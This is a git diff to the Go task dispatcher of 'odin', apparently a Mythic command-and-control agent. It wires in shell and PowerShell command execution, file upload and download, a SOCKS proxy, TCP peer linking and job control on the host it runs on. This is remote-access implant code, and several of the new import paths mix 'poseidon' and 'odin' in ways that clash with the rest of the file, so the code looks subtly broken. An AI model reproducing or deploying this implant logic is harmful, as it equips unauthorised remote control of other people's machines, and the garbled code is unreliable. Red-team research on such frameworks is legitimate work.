@@ -11,21 +11,25 @@ import (
 	"sync"
 
 	// Odin
+	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/bash_executor"
+	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/cmd_executor"
 	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/download"
-	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/zsh_executor"
-  "github.com/MythicAgents/odin/Payload_Type/odin/agent_code/sh_executor"
-  "github.com/MythicAgents/odin/Payload_Type/odin/agent_code/bash_executor"
-  "github.com/MythicAgents/odin/Payload_Type/odin/agent_code/cmd_executor"
-  "github.com/MythicAgents/odin/Payload_Type/odin/agent_code/powershell_executor"
+	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/powershell_executor"
+	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/sh_executor"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
 	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/upload"
+	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/zsh_executor"
 	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/pkg/profiles"
   "github.com/MythicAgents/odin/Payload_Type/odin/agent_code/pkg/utils/structs"
+
 )
 import (
 	"encoding/binary"
 	"os"
 
-	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/sleep"
+	"github.com/MythicAgents/poseidon/Payload_Type/odin/agent_code/link_tcp"
+	"github.com/MythicAgents/poseidon/Payload_Type/odin/agent_code/sleep"
+	"github.com/MythicAgents/poseidon/Payload_Type/odin/agent_code/unlink_tcp"
 )
 
 const (
@@ -50,12 +54,17 @@ var tasktypes = map[string]int{
 	"exit":              EXIT_CODE,
 	"bash_executor":     1,
   "cmd_executor":      2,
-  "powershell_executor": 3,
-	"download":          4,
-	"upload":            5,
-	"sh_executor":       6,
-  "zsh_executor":      7,
-	"sleep":             8,
+	"download":          3,
+	"jobs":              4,
+	"jobkill":           5,
+  "powershell_executor": 6,
+	"socks":             7,
+	"sh_executor":       8,
+	"upload":            9,
+  "zsh_executor":      10,
+	"sleep":             11,
+	"link_tcp":          12,
+	"unlink_tcp":        13,
 	"none":              NONE_CODE,
 }
 
@@ -264,23 +273,40 @@ func handleNewTask() {
 				go cmd_executor.Run(task)
 				break
 			case 3:
-				go powershell_executor.Run(task)
-				break
-			case 4:
 				go download.Run(task)
 				break
+			case 4:
+				// Return the list of jobs.
+				go getJobListing(task)
+				break
 			case 5:
-				go upload.Run(task)
+				// Kill the job
+				go killJob(task)
 				break
 			case 6:
-				go sh_executor.Run(task)
+				go powershell_executor.Run(task)
 				break
 			case 7:
-				go zsh_executor.Run(task)
+				go socks.Run(task)
 				break
 			case 8:
+				go sh_executor.Run(task)
+				break
+			case 9:
+				go upload.Run(task)
+				break
+			case 10:
+				go zsh_executor.Run(task)
+				break
+			case 11:
 				// Sleep
 				go sleep.Run(task)
+				break
+			case 12:
+				go link_tcp.Run(task)
+				break
+			case 13:
+				go unlink_tcp.Run(task)
 				break
 			case NONE_CODE:
 				// No tasks, do nothing
